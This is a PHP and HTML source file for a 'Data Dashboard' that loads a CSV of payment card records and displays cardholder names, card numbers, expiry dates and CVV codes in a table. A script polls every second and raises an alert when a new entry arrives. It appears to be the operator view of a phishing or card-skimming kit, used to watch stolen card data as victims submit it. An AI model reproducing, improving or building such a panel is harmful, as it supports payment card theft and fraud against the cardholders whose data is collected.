<!DOCTYPE html>
<html>
<head>
  <title>Data Dashboard</title>
  <link rel="shortcut icon" href="https://s3-eu-west-1.amazonaws.com/landingi-editor-uploads/zalJxAee/ntls_logo.png"  type="image/x-icon">
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
  <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <!------ Include the above in your HEAD tag ---------->

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
  
  <style type="text/css">
    .card-counter{
      box-shadow: 2px 2px 10px #DADADA;
      margin: 5px;
      padding: 20px 10px;
      background-color: #fff;
      height: 100px;
      border-radius: 5px;
      transition: .3s linear all;
    }

    .card-counter:hover{
      box-shadow: 4px 4px 20px #DADADA;
      transition: .3s linear all;
    }

    .card-counter.primary{
      background-color: #007bff;
      color: #FFF;
    }

    .card-counter.danger{
      background-color: #ef5350;
      color: #FFF;
    }  

    .card-counter.success{
      background-color: #66bb6a;
      color: #FFF;
    }  

    .card-counter.info{
      background-color: #26c6da;
      color: #FFF;
    }  

    .card-counter i{
      font-size: 5em;
      opacity: 0.2;
    }

    .card-counter .count-numbers{
      position: absolute;
      right: 35px;
      top: 20px;
      font-size: 32px;
      display: block;
    }

    .card-counter .count-name{
      position: absolute;
      right: 35px;
      top: 65px;
      font-style: italic;
      text-transform: capitalize;
      opacity: 0.5;
      display: block;
      font-size: 18px;
    }
    table{
      width:100%;
    }
    #example_filter{
        float:right;
    }
    #example_paginate{
        float:right;
    }
    label {
        display: inline-flex;
        margin-bottom: .5rem;
        margin-top: .5rem;
       
    }
    .table td, .table th {
      padding: 2px !important;
    }
  </style>
    <script>
      $(document).ready(function(){
        setInterval(function(){
          var prv = parseInt($('#prv').text());
          $("#count").load('get_contact_data_count.php');
          var now = parseInt($('#count').text());
          if(now>prv){
            $("#prv").text(now);
            confirm('New user added please check!');
            location.reload();
          }else{
            $("#prv").text(now);
          }
          // if(isNaN(now)){
          //   location.reload();
          // }
        }, 1000);
        
      });
    </script>
</head>
<body>
  <div class="container">
    <div class="row">
      <div class="col-md-12">
        <h3>Yalgaar Data Dashboard</h3>
      </div>
    </div>
    <div class="row">
      <div class="col-md-6">
        <div class="card-counter info">
          <i class="fa fa-users"></i>
          <span class="count-numbers">
            <font id="count"></font>
            <font id="prv" style="display: none;"></font>
          </span>
          <span class="count-name">Total Number of Data</span>
        </div>
      </div>
      <!-- <div>
        <?php
        //echo "<i class='fa fa-file-excel-o'></i> <a href='download.php?file=contact_data.csv' class='btn btn-download'> "."Download File <i class='fa fa-download' aria-hidden='true'></i></a>\n";
        ?>       </div> -->
    </div>
    <div class="row">
      <table id="example" class="table table-striped table-bordered" style="width:100%">
        <thead>
          <tr>
            <th>S No.</th>
            <th>Card Holder</th>
            <th>Card Number</th>
            <th>Expiry</th>
            <th>CVV</th>
            <th>Date</th>
            <th>Time</th>
          </tr>
        </thead>
        <tbody>
          <?php
          ?>

          <?php 
          if(file_exists('contact_data.csv')) {
            function loadCSV($file) {
              $rows = array();
              if (($handle = fopen($file, "r")) !== FALSE) {
                while (($data = fgetcsv($handle, 0, ",")) !== FALSE) {
                  array_push($rows, $data);
                }
                fclose($handle);
              }
              return array_reverse($rows);
            }
            // Open uploaded CSV file with read-only mode
            $file_data = loadCSV('contact_data.csv');
            // Parse data from CSV file line by line
            $sno=1;
            for ($i=0; $i < count($file_data); $i++) { 
              $cardholder = $file_data[$i][1];
              $number = $file_data[$i][2];
              $expiry = $file_data[$i][3];
              $cvc = $file_data[$i][4];
              $date = $file_data[$i][5];
              $time = $file_data[$i][6]; ?>
            <tr>
              <td><?= $sno?></td>
              <td><?= $cardholder?></td>
              <td><?= $number?></td>
              <td><?= $expiry?></td>
              <td><?= $cvc?></td>
              <td><?= $date?></td>
              <td><?= $time?></td>
            </tr>
          <?php $sno+=1; } 
          } else{ ?>
            <tr>
              <td colspan="5">No Record found!</td>
            </tr>
          <?php } ?>
        </tbody>
      </table>
    </div>
  </div>
<script src="https://cdn.datatables.net/1.10.16/js/jquery.dataTables.min.js"></script>
  <script src="https://cdn.datatables.net/1.10.16/js/dataTables.bootstrap4.min.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    $('#example').DataTable(
        
         {     

      "aLengthMenu": [[5, 10, 25, -1], [5, 10, 25, "All"]],
        "iDisplayLength": 5
       } 
        );
} );
</script>
</body>
</html>